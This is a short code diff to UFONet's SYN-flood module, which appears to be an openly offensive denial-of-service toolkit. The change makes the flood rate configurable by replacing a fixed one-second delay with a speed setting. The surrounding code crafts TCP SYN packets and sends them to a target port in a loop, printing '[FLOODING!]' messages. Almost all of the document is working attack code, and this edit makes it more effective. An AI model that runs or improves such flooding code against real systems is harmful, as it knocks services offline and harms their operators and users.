@@ -10,6 +10,7 @@ with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket, time
+from core.mods.mod_config import SYNFLOOD_SPEED
 
 from numpy import source
 try:
@@ -51,7 +52,7 @@ def synize(ip, port, rounds, source_ip = None):
             except:
                 print("[Error] [AI] [UFOSYN] Imposible to resolve IP from target -> [Aborting!]\n")
                 break
-            TCP_l = TCP()	
+            TCP_l = TCP()
             TCP_l.sport = sport
             TCP_l.dport = port
             TCP_l.flags = "S" # SYN
@@ -60,7 +61,7 @@ def synize(ip, port, rounds, source_ip = None):
             try:
                 send(IP_p/TCP_l, verbose=0)
                 print("[Info] [AI] [UFOSYN] Firing 'quantum hook' ["+str(n)+"] -> [FLOODING!]")
-                time.sleep(1) # sleep time required for balanced sucess
+                time.sleep(1/SYNFLOOD_SPEED) # sleep time required for balanced success
             except:
                 print("[Error] [AI] [UFOSYN] Failed to engage with 'quantum hook' ["+str(n)+"]")
     except:
